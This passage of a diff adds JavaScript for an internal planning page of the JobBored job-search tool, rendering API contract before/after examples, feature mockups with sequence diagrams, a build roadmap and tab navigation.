+   before:"// worker POST /ingest-url (write failure escapes the handler)\n"+J({message:"Internal error handling ingest-url request."})+"\n\n// API POST /api/scrape-job\n"+J({error:"Body must include { url: string }"})+"\n\n// API unknown route\n<pre>Cannot GET /nope</pre>   (text/html)",
+   after:J({error:"No Google Sheets credential is available for this Sheet.",code:"SHEETS_CREDENTIAL_MISSING",detail:"Sign in with Google or save a service-account key before adding a job.",nextStep:"Open Settings → Google and connect your Sheet.",retryable:false,requestId:"req_7f3a9c"})},
+  {name:"Discovery webhook", ver:"v1 → v1.1", kind:"additive", ids:"A20 · A6 · A7",
+   why:"An optional idempotency key stops a double click or a scheduler retry from starting a second paid run. The schema also adopts the parser's local sheetId fallback so the two stop disagreeing.",
+   before:"POST /webhook\n"+J({event:"command-center.discovery",schemaVersion:1,sheetId:"<sheet>",variationKey:"v7",requestedAt:"2026-09-25T13:02:11Z",discoveryProfile:{targetRoles:["Backend Engineer"]}})+"\n\n// same body again → a second run\n"+J({ok:true,kind:"accepted_async",runId:"run_805dc403"}),
+   after:"POST /webhook\n"+J({event:"command-center.discovery",schemaVersion:1,sheetId:"<sheet>",variationKey:"v7",requestedAt:"2026-09-25T13:02:11Z",idempotencyKey:"dash-7f3a-1727269331",discoveryProfile:{targetRoles:["Backend Engineer"]}})+"\n\n// same key again → the existing run\n"+J({ok:true,kind:"accepted_async",runId:"run_50bb7abf",duplicate:true,statusPath:"/runs/run_50bb7abf",pollAfterMs:2000})},
+  {name:"Pipeline update", ver:"v1 → v2", kind:"breaking", ids:"D6 · D7 · D21",
+   why:"Applied must carry its date and source, and the patcher maps columns by header instead of fixed letters. Today a drifted header writes the stage into Contact and returns 200.",
+   before:"POST /pipeline-update\n"+J({event:"command-center.pipeline-update",schemaVersion:1,sheetId:"<sheet>",job:{url:"https://boards.greenhouse.io/acme/jobs/1"},fields:{stage:"Applied"}})+"\n\n→ 200\n"+J({ok:true,matched:true,matchedBy:"url",rowNumber:2}),
+   after:"POST /pipeline-update\n"+J({event:"command-center.pipeline-update",schemaVersion:2,sheetId:"<sheet>",job:{url:"https://boards.greenhouse.io/acme/jobs/1"},fields:{stage:"Applied",appliedDate:"2026-09-25",source:"Company portal",note:"Receipt R-17"}})+"\n\n→ 409 on a drifted header\n"+J({error:"The Pipeline header no longer matches the schema.",code:"HEADER_MISMATCH",detail:"Column M is 'Contact'; expected 'Status'.",nextStep:"Restore the header row or re-run setup.",retryable:false})},
+  {name:"Cancel a run", ver:"run-status.v1", kind:"new", ids:"A21",
+   why:"runDiscovery already accepts an AbortSignal; nothing passes one. Cancelling stops paid calls now instead of at the 60-minute cap.",
+   before:"// no route: the user waits for the run cap", after:"POST /runs/run_50bb7abf/cancel   (x-discovery-secret)\n→ 202\n"+J({ok:true,runId:"run_50bb7abf",status:"cancelling",statusPath:"/runs/run_50bb7abf"})+"\n\nGET /runs/run_50bb7abf\n"+J({runId:"run_50bb7abf",status:"failed",terminal:true,reason:"cancelled_by_user",progress:{sequence:41}})},
+  {name:"Run history list", ver:"run-status-list.v1", kind:"new", ids:"A19 · C22",
+   why:"Terminal snapshots already hold per-source counts and rejection reasons. A list route lets the Runs tab reopen any run after a reload.",
+   before:"// only GET /runs/:id for one known id", after:"GET /runs?sheetId=<sheet>&limit=20\n"+J({runs:[{runId:"run_50bb7abf",state:"partial",startedAt:"2026-09-25T13:02:11Z",durationS:412,sources:[{id:"greenhouse",seen:25,accepted:18,written:12,rejections:{excluded_keyword:4,duplicate:3}},{id:"workday",seen:0,accepted:0,written:0,failure:"board_timeout"}],cost:{llmCalls:37,geminiSearches:10,browserUseSessions:6}}]})},
+  {name:"Discovery preview", ver:"discovery-preview.v1", kind:"new", ids:"B20 · B23",
+   why:"The effective plan is computed by pure functions, so a preview costs nothing and shows exactly what the run will do and spend.",
+   before:"// no preview: the first feedback is a finished (or partial) run", after:"POST /discovery/preview   (same body as /webhook)\n"+J({effectiveSources:["greenhouse","lever","grounded_web"],companies:{restricted:["Acme","Globex"],unknownAllowlist:["Globexx"],blocklistHits:["Initech"]},queryRungs:3,predicted:{llmCalls:[18,40],geminiSearches:10,browserUseSessions:[4,12],inputTokens:[45000,95000]},warnings:["Unknown companyAllowlist entry ignored: Globexx"]})},
+  {name:"Capture preview", ver:"ingest-url.v1", kind:"new", ids:"C19 · E20 · E3",
+   why:"Preview returns every field with where it came from, and writes nothing. A Google Jobs fallback that matched only title and company is labelled as a similar posting instead of passed off as this one.",
+   before:"POST /ingest-url → writes the row immediately\n"+J({ok:true,written:true,company:"Careers",location:""}), after:"POST /ingest-url?preview=1\n"+J({ok:true,written:false,fields:{title:{value:"Senior Backend Engineer",method:"json-ld"},company:{value:"Acme Robotics",method:"json-ld"},location:{value:"Berlin, Germany",method:"serpapi-google-jobs",matchKind:"title_company",confidence:0.62}},fetchedAt:"2026-09-25T13:05:40Z",duplicateOf:null})},
+  {name:"LLM config", ver:"llm-config (behavior)", kind:"behavior", ids:"E2 · E12",
+   why:"Local (Ollama) normalizes to openai_compatible for every consumer, and a save without an apiKey keeps the stored key instead of erasing it.",
+   before:"POST /api/llm-config\n"+J({provider:"local",model:"gemma4:e2b",baseUrl:"http://127.0.0.1:11434/v1"})+"\n→ ATS: \"Missing API key. Save a key in Settings.\"", after:"POST /api/llm-config\n"+J({provider:"local",model:"gemma4:e2b",baseUrl:"http://127.0.0.1:11434/v1"})+"\n→ 200\n"+J({provider:"openai_compatible",alias:"local",model:"gemma4:e2b",keyPresent:false,verified:null})},
+  {name:"Worker health identity", ver:"health (additive)", kind:"additive", ids:"G7 · G21 · G11",
+   why:"The dev-server stops killing another checkout's worker and can say which env file supplied each key (never the value).",
+   before:"GET /health\n"+J({ok:true,service:"browser-use-discovery"}), after:"GET /health\n"+J({ok:true,service:"browser-use-discovery",repoRoot:"/Users/you/Job-Bored",version:"1.0.0",pid:18106,envSources:{BROWSER_USE_DISCOVERY_WEBHOOK_SECRET:"~/.jobbored/browser-use-discovery/.env",GEMINI_API_KEY:"(unset)"}})},
+  {name:"Relay auth", ver:"relay (breaking)", kind:"breaking", ids:"G1 · G24",
+   why:"Today any caller who knows the workers.dev URL gets the worker secret injected. After: the dashboard holds a relay token minted at deploy; anonymous calls are refused and only /webhook and /runs/* pass.",
+   before:"POST https://relay.example.workers.dev/anything   (no auth)\n→ 202, upstream sees x-discovery-secret", after:"POST https://relay.example.workers.dev/webhook\nAuthorization: Bearer <relay token>\n→ 202\n\nPOST https://relay.example.workers.dev/anything   (no auth)\n→ 401\n"+J({error:"Relay token required.",code:"RELAY_UNAUTHORIZED",retryable:false})},
+  {name:"Opportunity events", ver:"pipeline-events.v1 · application-receipt.v1", kind:"new", ids:"D23 · D24 · H24",
+   why:"Every writer appends one event row, which is race-free and turns funnel, time-in-stage and follow-up into group-bys. Applied carries a receipt.",
+   before:"// state is the current row only; Notes is read-modify-written", after:"PipelineEvents tab row\n"+J({at:"2026-09-25T15:12:00-05:00",jobKey:"greenhouse:acme:1",from:"Researching",to:"Applied",source:"dashboard",actor:"user",receipt:{appliedDate:"2026-09-25",via:"Company portal",note:"Receipt R-17",followUp:"2026-10-02"}})}
+];
+document.getElementById("contract-list").innerHTML = CONTRACTS.map(c => `<article class="contract">
+  <h3>${esc(c.name)} <span class="chip kind-${c.kind}">${esc(c.kind)}</span><span class="ver">${esc(c.ver)}</span><span class="chip">${esc(c.ids)}</span></h3>
+  <p class="why">${esc(c.why)}</p>
+  <div class="ba"><div><h4>Before · f227fbb</h4><pre>${esc(c.before)}</pre></div><div class="after"><h4>After</h4><pre>${esc(c.after)}</pre></div></div>
+</article>`).join("");
+
+/* ---------- sequence renderer ---------- */
+function seq(actors, msgs, key){
+  const colW = 172, pad = 16, top = 12, boxH = 28, rowH = 30, w = pad*2 + colW*actors.length, h = top + boxH + 18 + rowH*msgs.length + 10;
+  const x = i => pad + colW*i + colW/2;
+  let s = `<svg viewBox="0 0 ${w} ${h}" role="img" aria-label="sequence" xmlns="http://www.w3.org/2000/svg"><defs><marker id="sq-${key}" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" style="fill:var(--navy)"/></marker></defs>`;
+  actors.forEach((a,i) => { s += `<line x1="${x(i)}" y1="${top+boxH}" x2="${x(i)}" y2="${h-6}" style="stroke:var(--line-strong);stroke-dasharray:3 4"/><rect x="${x(i)-colW/2+8}" y="${top}" width="${colW-16}" height="${boxH}" rx="8" style="fill:var(--surface-2);stroke:var(--line-strong)"/><text x="${x(i)}" y="${top+18}" text-anchor="middle" style="fill:var(--ink);font:700 11px var(--f-body)">${esc(a)}</text>`; });
+  msgs.forEach((m,k) => {
+    const y = top + boxH + 26 + k*rowH, a = m[0], b = m[1];
+    if (a === b) { s += `<path d="M${x(a)} ${y-6} h26 v12 h-26" style="fill:none;stroke:var(--navy);stroke-width:1.3" marker-end="url(#sq-${key})"/><text x="${x(a)+32}" y="${y+4}" style="fill:var(--ink-2);font:500 10.5px var(--f-body)">${esc(m[2])}</text>`; return; }
+    s += `<line x1="${x(a)}" y1="${y}" x2="${x(b)}" y2="${y}" style="stroke:var(--navy);stroke-width:1.3${m[3]?";stroke-dasharray:4 3":""}" marker-end="url(#sq-${key})"/><text x="${(x(a)+x(b))/2}" y="${y-5}" text-anchor="middle" style="fill:var(--ink-2);font:500 10.5px var(--f-body)">${esc(m[2])}</text>`;
+  });
+  return s + `</svg>`;
+}
+
+/* ---------- Features ---------- */
+const FEATURES = [
+  {n:1,title:"Discovery preview and cost receipt",tags:"T0 · B20 · B23 · find · M",
+   value:"Before spending a cent, a job hunter sees which companies, sources and queries a run will use, which allowlist entries were ignored, and a call and token estimate. Afterwards, every run row says what it cost.",
+   actors:["Dashboard","Worker","Planner (pure)"], msgs:[[0,1,"POST /discovery/preview"],[1,2,"merge config + intent"],[2,1,"sources, companies, rungs"],[1,0,"plan + predicted calls"],[0,1,"POST /webhook (same body)",1],[1,0,"runId → DiscoveryRuns cost cols",1]],
+   api:"POST /discovery/preview → discovery-preview.v1\n{ effectiveSources, companies{restricted,unknownAllowlist,blocklistHits},\n  queryRungs, predicted{llmCalls,geminiSearches,browserUseSessions,inputTokens}, warnings }",
+   mock:`<div class="jbcard"><div class="jbh">Before you run</div>
+     <dl class="kv"><dt>Sources</dt><dd>Greenhouse · Lever · Web search</dd><dt>Companies</dt><dd>Acme, Globex <span class="chip warn">1 ignored: Globexx</span></dd><dt>Skipped</dt><dd>Initech (blocklist)</dd><dt>Estimate</dt><dd class="mono">18–40 AI calls · 10 searches · ≈45–95k tokens</dd></dl>
+     <div class="notice">"Globexx" isn't in the catalog, so it won't be searched. Fix the spelling or remove it.</div>
+     <div class="btnrow"><span class="jbbtn">Run discovery</span><span class="jbbtn ghost">Edit plan</span></div></div>`},
+  {n:3,title:"Duplicate review",tags:"T1-2 · D22 · triage · M",
+   value:"The writer already detects possible duplicates and throws them away as warnings. Keeping them lets a job hunter merge an alternate ATS link into the role they are already tracking instead of working two rows.",
+   actors:["Worker writer","Review tab","Dashboard"], msgs:[[0,0,"collision: same role, new URL"],[0,1,"append {rowA, incoming, reason}"],[2,1,"read open reviews"],[2,2,"badge: 2 possible duplicates"],[2,0,"merge → mark loser dismissed",1]],
+   api:"Review tab (review-tab.v1): rowA · incomingUrl · reason · detectedAt · decision\nPOST /pipeline-update { event: 'merge', keep: rowA, alias: incomingUrl }",
+   mock:`<div class="jbcard"><div style="display:flex;justify-content:space-between;gap:8px;align-items:center"><strong>Senior Backend Engineer · Acme</strong><span class="chip warn">2 possible duplicates</span></div>
+     <table class="rows" style="margin-top:8px"><thead><tr><th>Field</th><th>Tracking</th><th>Found</th></tr></thead><tbody>
+     <tr><td>Link</td><td class="mono">greenhouse.io/acme/1</td><td class="mono">acme.com/careers/1</td></tr>
+     <tr><td>Location</td><td>Berlin</td><td>Berlin, DE</td></tr>
+     <tr><td>Salary</td><td>—</td><td>€95–110k</td></tr></tbody></table>
+     <div class="btnrow"><span class="jbbtn">Merge into tracked role</span><span class="jbbtn ghost">Keep both</span></div></div>`},
+  {n:4,title:"Opportunity timeline, funnel and submission receipt",tags:"T2 · D23 · D24 · H24 · follow up · M",
+   value:"Every stage change, note and application becomes an event, so the dossier shows what happened when, Applied carries proof, and funnel numbers count real transitions instead of today's snapshot.",
+   actors:["Any writer","PipelineEvents","Dossier"], msgs:[[0,1,"append {from,to,source,at}"],[0,1,"Applied + receipt",0],[2,1,"events for jobKey"],[2,2,"timeline + next action"]],
+   api:"PipelineEvents (pipeline-events.v1): at · jobKey · from · to · source · actor · receipt?\napplication-receipt.v1: appliedDate · via · note · evidenceRef · followUp",
+   mock:`<div class="jbcard"><div class="jbh">Acme · Senior Backend Engineer</div>
+     <ol class="tl">
+       <li style="--stage:var(--amber-bright)"><time>Sep 25 15:12</time><span class="stage">Applied</span> via Company portal · receipt R-17 · follow up Oct 2</li>
+       <li style="--stage:var(--violet)"><time>Sep 24 09:40</time><span class="stage">Researching</span> from dashboard</li>
+       <li style="--stage:var(--ink-3)"><time>Sep 23 07:02</time><span class="stage">New</span> found by discovery run_50bb</li>
+     </ol>
+     <div class="notice ok">Next: follow up with the recruiter on Oct 2.</div></div>`},
+  {n:5,title:"Capture preview",tags:"T1-1 · C19 · E20 · find · M",
+   value:"Pasting a link shows what JobBored extracted and where each field came from before anything touches the Sheet. A similar posting from Google Jobs is labelled as such.",
+   actors:["Dashboard","Worker /ingest-url","Shared scraper"], msgs:[[0,1,"POST ?preview=1"],[1,2,"scrapeJobPosting()"],[2,1,"fields + method + matchKind"],[1,0,"preview, written:false"],[0,1,"Save (no preview flag)",1]],
+   api:"POST /ingest-url?preview=1 → ingest-url.v1\n{ fields{ title,company,location: {value, method, matchKind?, confidence?} }, fetchedAt, duplicateOf }",
+   mock:`<div class="jbcard"><div class="jbh">Add this role?</div>
+     <dl class="kv"><dt>Title</dt><dd>Senior Backend Engineer <span class="chip">from the page</span></dd><dt>Company</dt><dd>Acme Robotics <span class="chip">from the page</span></dd><dt>Location</dt><dd>Berlin, Germany <span class="chip warn">similar posting · Google Jobs</span></dd></dl>
+     <div class="notice">The location came from a similar Google Jobs listing, not this page. Check it before saving.</div>
+     <div class="btnrow"><span class="jbbtn">Save to Pipeline</span><span class="jbbtn ghost">Edit fields</span></div></div>`},
+  {n:6,title:"Run history drill-down and cancel",tags:"T1-8 · A19 · A21 · C22 · triage · M",
+   value:"A sparse morning run explains itself after a reload: per-source seen, accepted and written counts, rejection reasons, board failures and cost. A run started with the wrong profile can be stopped immediately.",
+   actors:["Runs tab","Worker","Run store"], msgs:[[0,1,"GET /runs?sheetId=&limit=20"],[1,2,"terminal snapshots"],[1,0,"runs[] with sources + cost"],[0,1,"POST /runs/:id/cancel"],[1,1,"abort runSignal"],[1,0,"status: cancelled_by_user",1]],
+   api:"GET /runs?sheetId=&limit= → run-status-list.v1\nPOST /runs/:id/cancel → 202 { status: 'cancelling' }",
+   mock:`<div class="jbcard"><div style="display:flex;justify-content:space-between;align-items:center;gap:8px"><strong>This morning · partial · 6m 52s</strong><span class="jbbtn ghost" style="padding:3px 10px">Cancel</span></div>
+     <table class="rows" style="margin-top:8px"><thead><tr><th>Source</th><th class="num">Seen</th><th class="num">Kept</th><th class="num">Written</th><th>Why fewer</th></tr></thead><tbody>
+     <tr><td><span class="dot d-ok"></span>Greenhouse</td><td class="num">25</td><td class="num">18</td><td class="num">12</td><td>4 off-profile, 3 dupes</td></tr>
+     <tr><td><span class="dot d-bad"></span>Workday · Acme</td><td class="num">0</td><td class="num">0</td><td class="num">0</td><td>board timed out (3 runs)</td></tr>
+     <tr><td><span class="dot d-warn"></span>Web search</td><td class="num">10</td><td class="num">2</td><td class="num">2</td><td>8 job boards (hint only)</td></tr></tbody></table>
+     <p style="margin:8px 0 0;font-size:.78rem;color:var(--ink-3)" class="mono">cost: 37 AI calls · 10 searches · 6 browser sessions</p></div>`},
+  {n:7,title:"Setup control center",tags:"T0 · T1-10 · G21 · G22 · E21 · setup · M",
+   value:"A new user sees whether each background piece is really running, which checkout owns it, when it last worked, and what exactly a fix would change, with nothing installed until they click.",
+   actors:["Settings","dev-server","Worker / launchd"], msgs:[[0,1,"GET /__proxy/ops-status"],[1,2,"/health identity + launchctl print"],[1,0,"jobs[] + dry-run diffs"],[0,1,"POST fix (explicit)",1]],
+   api:"GET /__proxy/ops-status → { jobs[{ name, active, owner{repoRoot,pid}, lastSuccessAt, portOwner, dryRun }] }\nPOST /api/llm-config/verify → 1-token completion, api-error.v1 on failure",
+   mock:`<div class="jbcard"><div class="jbh">Discovery setup</div>
+     <table class="rows"><tbody>
+     <tr><td><span class="dot d-ok"></span>Worker</td><td>running · this checkout · last run 07:02</td></tr>
+     <tr><td><span class="dot d-bad"></span>Port 8644</td><td>held by another checkout (ux01) <span class="chip warn">fix</span></td></tr>
+     <tr><td><span class="dot d-warn"></span>Keep-alive</td><td>installed, not loaded by launchd</td></tr>
+     <tr><td><span class="dot d-ok"></span>AI provider</td><td>Local · gemma4 · verified 07:00</td></tr>
+     <tr><td><span class="dot d-ok"></span>Relay</td><td>locked with a token</td></tr></tbody></table></div>`},
+  {n:9,title:"Rescore preview",tags:"F23 · F4 · triage · S",
+   value:"After editing the profile, the job hunter sees how five sample roles would move before the whole Sheet is rewritten, and overlapping rescores can no longer let stale scores win.",
+   actors:["Settings","API /profile/rescore","LLM"], msgs:[[0,1,"POST ?preview=5"],[1,2,"score 5 rows (dry run)"],[1,0,"old → new deltas"],[0,1,"commit (generation id)",1]],
+   api:"POST /profile/rescore?preview=5 → SSE { row, oldScore, newScore, reason }\nPOST /profile/rescore → 409 rescore_in_progress while another generation runs",
+   mock:`<div class="jbcard"><div class="jbh">Preview new scores</div>
+     <table class="rows"><thead><tr><th>Role</th><th class="num">Now</th><th class="num">New</th></tr></thead><tbody>
+     <tr><td>Acme · Backend</td><td class="num">6</td><td class="num" style="color:var(--mint);font-weight:700">9</td></tr>
+     <tr><td>Globex · Platform</td><td class="num">7</td><td class="num">7</td></tr>
+     <tr><td>Initech · Data</td><td class="num">8</td><td class="num" style="color:var(--rose);font-weight:700">4</td></tr></tbody></table>
+     <div class="btnrow"><span class="jbbtn">Rescore all 312 roles</span></div></div>`}
+];
+document.getElementById("feature-list").innerHTML = FEATURES.map((f,i) => `<article class="feat">
+  <div class="meta"><h3>${f.n}. ${esc(f.title)}</h3><div><span class="chip">${esc(f.tags)}</span></div>
+    <p class="value">${esc(f.value)}</p>
+    <div class="seq scroll">${seq(f.actors, f.msgs, "f"+i)}</div>
+    <pre>${esc(f.api)}</pre></div>
+  <div class="mockframe"><span class="tape">in the app</span>${f.mock}</div>
+</article>`).join("");
+
+/* ---------- Roadmap ---------- */
+const LANESPEC = [
+  {w:0,l:"P",name:"Perimeter",fam:"sol",eff:"M",claims:"E1 G2 G3 A1 G4 G10"},
+  {w:0,l:"R",name:"Relay auth",fam:"sol",eff:"M",claims:"G1 G24"},
+  {w:0,l:"X",name:"Egress",fam:"sol",eff:"M",claims:"C1 C2 D15 C8 C9 E8",after:"after P"},
+  {w:1,l:"S",name:"Sheets client",fam:"sol",eff:"L",claims:"D1–D6 D9 D12 D13 D16 D17 D18 A8",after:"after one Error-cell PR"},
+  {w:1,l:"Q",name:"AI provider",fam:"sol",eff:"L",claims:"E15 E2 E9 E10 E12 E14 B17"},
+  {w:1,l:"L",name:"Lifecycle + contracts",fam:"sol",eff:"L",claims:"A2–A5 A7 A9 A12 A15 A18 A20 A21 E7",after:"after #102"},
+  {w:1,l:"H",name:"Hermes safety",fam:"sol",eff:"L",claims:"H1–H8 H10–H13 H15 H16 H19 H21–H23"},
+  {w:2,l:"D",name:"Discovery engine",fam:"sol",eff:"L",claims:"B1–B3 B6 B8 B9 B11–B13 C3–C6 C15",after:"after Q, X"},
+  {w:2,l:"M",name:"Materials + profile",fam:"sol",eff:"L",claims:"F1–F8 F11 F13 F14 F18 E13",after:"after Q"},
+  {w:2,l:"O",name:"Ops",fam:"sol",eff:"M",claims:"G5–G9 G11 G12 G14 G15 G20 E5 E6",after:"after P"},
+  {w:2,l:"B",name:"Browser surfaces",fam:"opus",eff:"M",claims:"E4 D11 D24"},
+  {w:3,l:"F",name:"Features",fam:"sol",eff:"L",claims:"§6 #1, #3–#9",fam2:"opus"},
+  {w:3,l:"G",name:"Splits + docs",fam:"gemini",eff:"M",claims:"B15 B16 C14 G18 A11 G17 H20"}
+];
+const WAVES = ["Wave 0 · contain P0","Wave 1 · substrates","Wave 2 · consumers","Wave 3 · features and cleanup"];
+document.getElementById("waves").innerHTML = WAVES.map((t,w) => `<div class="wave"><h3>${esc(t)}</h3>${LANESPEC.filter(x => x.w === w).map(x => `<div class="lane"><div class="lh"><span class="letter">${x.l}</span><strong>${esc(x.name)}</strong><span class="chip fam-${x.fam}">${x.fam}${x.fam2?" + "+x.fam2:""}</span><span class="chip">${x.eff}</span></div><div class="claims">${esc(x.claims)}</div>${x.after?`<div class="after">${esc(x.after)}</div>`:""}</div>`).join("")}</div>`).join("");
+(function(){
+  const nodes = [], colX = [16, 206, 396, 586];
+  const count = [0,0,0,0];
+  for (const x of LANESPEC) { const i = count[x.w]++; nodes.push({id:x.l,x:colX[x.w],y:34+i*62,w:168,h:46,label:`${x.l} · ${x.name}`,sub:`${x.fam}${x.fam2?" + "+x.fam2:""} · effort ${x.eff}`,state:x.w===0?"chg":x.w===1?"new":""}); }
+  nodes.push({id:"PR102",x:16,y:230,w:168,h:40,ext:1,label:"PR #102 merged",sub:"discovery hardening"});
+  nodes.push({id:"ERR",x:16,y:290,w:168,h:40,ext:1,label:"One Error-cell PR",sub:"#113 then #107"});
+  const edges = [["P","X","shared file","chg"],["P","O","dev-server","chg"],["Q","D","provider API","new"],["Q","M","provider API","new"],["X","D","session signal","chg"],["PR102","L","",""],["ERR","S","",""],["S","F"],["L","F"],["Q","F"]];
+  let svg = graph(nodes, edges, 770, 340, {key:"rm",label:"Build program dependency graph"});
+  svg = svg.replace("</svg>", WAVES.map((t,w) => `<text x="${colX[w]}" y="18" style="fill:var(--ink-3);font:700 10px var(--f-body);letter-spacing:.06em">${esc(t.toUpperCase())}</text>`).join("") + "</svg>");
+  document.getElementById("svg-roadmap").innerHTML = svg;
+})();
+
+/* ---------- tabs ---------- */
+const tabs = [...document.querySelectorAll(".tab")];
+function show(id, push){
+  tabs.forEach(t => { const on = t.getAttribute("aria-controls") === id; t.setAttribute("aria-selected", on); t.tabIndex = on ? 0 : -1; document.getElementById(t.getAttribute("aria-controls")).hidden = !on; });
+  if (push) { try { history.replaceState(null, "", "#" + id); } catch (e) {} }
+}
+tabs.forEach((t,i) => {
+  t.addEventListener("click", () => show(t.getAttribute("aria-controls"), true));
+  t.addEventListener("keydown", e => { if (e.key !== "ArrowRight" && e.key !== "ArrowLeft") return; const n = tabs[(i + (e.key === "ArrowRight" ? 1 : tabs.length - 1)) % tabs.length]; n.focus(); show(n.getAttribute("aria-controls"), true); });
+});
+const start = (location.hash || "").slice(1);
+show(["now","fixes","contracts","features","roadmap"].includes(start) ? start : "now", false);
+</script>
